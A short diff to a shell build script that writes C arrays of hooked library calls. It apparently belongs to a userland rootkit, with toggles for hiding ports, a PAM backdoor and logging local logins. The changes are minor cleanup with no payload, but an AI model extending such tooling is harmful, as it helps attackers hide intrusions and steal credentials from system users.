@@ -13,6 +13,7 @@ get_arrayelems(){ # returns the elements within the array we're checking
     echo -n "$array_elements"
 }
 
+# 
 get_hooks(){ # $1 = arrays file path
     local hooks location contents \
           array_name array_elements
@@ -70,10 +71,19 @@ buildall_arrays(){ # $1 = target file path
     # build a C array for it.
     while read -r line; do
         array_name="`get_arrayname "$line"`"
+
+        # don't write array of function names if we don't need them.
+        # this is, a. quite hacky & b. not 100% necessary, but if
+        # they take up extra space for no reason, just don't.
+        [ $array_name == "libpcap_calls" ] && \
+            [ "`toggle_enabled HIDE_PORTS`" == "false" ] && \
+                continue
+
         [ $array_name == "libpam_calls" ] && { \
             [ "`toggle_enabled USE_PAM_BD`" == "false" ] && \
                 [ "`toggle_enabled LOG_LOCAL_AUTH`" == "false" ] && continue; \
         }
+
         array_elements="`get_arrayelems "$line"`"
 
         # skip building the current array in the current 'arrays' file
@@ -93,6 +103,8 @@ buildall_arrays(){ # $1 = target file path
     echo -n "$arrays"
 }
 
+# this used to be write_char_arrays. due to removal of the 'arrays' files
+# system, i'm working on cleaning this all up a bit.
 write_hooks(){
     local arrays location hooks
 
